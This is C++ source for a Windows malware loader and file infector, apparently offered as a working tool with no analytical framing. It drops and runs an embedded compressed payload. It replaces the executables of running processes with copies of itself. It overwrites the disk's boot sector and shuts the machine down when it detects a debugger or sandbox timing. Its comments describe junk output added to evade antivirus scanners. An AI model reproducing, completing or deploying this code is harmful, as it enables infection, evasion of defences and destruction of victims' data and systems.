#undef UNICODE
#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <windows.h>
#include <string>
#include <psapi.h>
#include <fstream>
#include <time.h>
#include <thread>
#include "Example_Image.h"
#include "lz4/lz4.h"

#define Loops 4 //number of times to loop through the process list
bool fexists(const std::string& filename);
void BiteIt(HANDLE Process);
int Decompress(const char* source, char* dest, int compressedSize, int maxDecompressedSize);
void EntryPoint(void);

int main() {
    FreeConsole();
    CreateMutexA(0, FALSE, "Local\\$LeechyLeech$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        std::exit(0);
    }
    SYSTEMTIME ST;
    GetLocalTime(&ST);
    int RandSeed = (int)time(NULL) * GetTickCount() * GetCurrentProcessId() * ST.wMilliseconds * ST.wYear / ST.wDay + ST.wMonth;
    srand(RandSeed);

    std::thread n(EntryPoint);

    while (1) {
        int Time = rand() % 300000 + 1000, Divider = rand() % 10000 + 100, DividedSleep = Time / Divider;
        char CharacterSet[71] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','\\','*','[',']','/','-','_','\"','\'','1','2','3','4','5','6','7','8','9','0' };
        char fuwyegkfuwegfyuwegfk[40];
        memset(fuwyegkfuwegfyuwegfk, 0xc9, sizeof(fuwyegkfuwegfyuwegfk) - 1);
        for (int j = 0; j <= Divider; j++) {
            Sleep(DividedSleep);
            double hjfwblfuwflwfue = atan(rand());
            float fdgyufwyuefgukwefg = atan2((float)rand(), (float)rand());
            std::string RandString1;
            for (int i = 0; i < 40; i++) {
                RandString1[i] = CharacterSet[rand() % 70 + 0];
            }
            char fuwyegkfuwegfyuwegfk[40];
            strcpy_s(fuwyegkfuwegfyuwegfk, RandString1.c_str());
            strcat_s(fuwyegkfuwegfyuwegfk, (std::to_string(rand())).c_str());
        }
        std::cout << "brat-volk inc. proudly presents" << std::endl;
        std::cout << "ANOTHER GREAT LOADER!" << std::endl;
        std::cout << "some other random text to fool VirusTotal and Anti-Malware solutions" << std::endl;
        std::cout << fuwyegkfuwegfyuwegfk << std::endl;
        std::exit(rand());
    }
}

void EntryPoint(void) {
    int dataSz = sizeof(rawData);
    char* Compressed = new char[dataSz];
    for (int i = 0; i < dataSz; i++) {
        Compressed[i] = rawData[i];
    }
    char* Decompressed  = new char[dataSz];
    DWORD WrittenBytes;
    if (fexists("BleedingWound.exe")) {
        char MyPath[MAX_PATH];
        GetModuleFileNameA(NULL, MyPath, MAX_PATH);
        std::string::size_type pos = std::string(MyPath).find_last_of("\\/");
        std::string FileToStart = std::string(MyPath).substr(0, pos);
        std::string DroppedExe = FileToStart;
        DroppedExe += "\\venom";
        DroppedExe += std::to_string(GetTickCount());
        DroppedExe += ".exe";
        FileToStart += "\\BleedingWound.exe";
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        CreateProcess(FileToStart.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        int y = Decompress(Compressed, Decompressed, dataSz, sizeof(Decompressed));
        HANDLE MyFile = CreateFileA(DroppedExe.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(MyFile, Decompressed, y, &WrittenBytes, NULL);      //write the raw hex
        CloseHandle(MyFile);
        CreateProcess(DroppedExe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    int c = 0;

    bloodlust:

    DWORD Tick1 = GetTickCount();
    int Time = 600000, Divider = rand() % 10000 + 100, DividedSleep = Time / Divider;
    for (int j = 0; j <= Divider; j++) {
        Sleep(DividedSleep);
    }
    DWORD PatchCheck = GetTickCount();
    if ((int)(PatchCheck - Tick1) < Time - 5000 || IsDebuggerPresent()) {
        char data[512];
        memset(data, 0x0F, sizeof(data));
        HANDLE hToken;
        LUID luid;
        LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &luid);
        TOKEN_PRIVILEGES tp;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        tp.PrivilegeCount = 1;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
        AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
        HANDLE disk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        WriteFile(disk, data, 512, &WrittenBytes, NULL);
        CloseHandle(disk);
        ExitWindowsEx(EWX_SHUTDOWN, 0);
        return;
    }
	DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        std::exit(0);
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    BOOL IsCritical;
    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            HANDLE Process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, aProcesses[i]);
            IsProcessCritical(Process,&IsCritical);
            if (!IsCritical) {
                std::thread Thread(BiteIt,Process);
                Thread.detach();
            }
        }
    }
    if (c < Loops) {
        c++;
        goto bloodlust;
    }
    std::exit(0);
}

bool fexists(const std::string& filename) {
    std::ifstream ifile(filename.c_str());
    return (bool)ifile;
}

void BiteIt(HANDLE Process) {
    while (1) {
        Sleep(60000);
        char MyPath[MAX_PATH];
        GetModuleFileNameA(NULL, MyPath, MAX_PATH);
        char PathToInfect[MAX_PATH];
        GetProcessImageFileNameA(Process, PathToInfect, MAX_PATH);
        std::string::size_type pos = std::string(PathToInfect).find_last_of("\\/");
        std::string TargetPath = std::string(PathToInfect).substr(0, pos);
        std::string RenamedTarget = TargetPath;
        RenamedTarget += "\\BleedingWound.exe";
        if (MoveFileA(PathToInfect, RenamedTarget.c_str()) && CopyFileA(MyPath, PathToInfect, false)) {
            break;
        }
    }
    CloseHandle(Process);
}

int Decompress(const char* source, char* dest, int compressedSize, int maxDecompressedSize)
{
    return LZ4_decompress_safe(source, dest, compressedSize, maxDecompressedSize);
}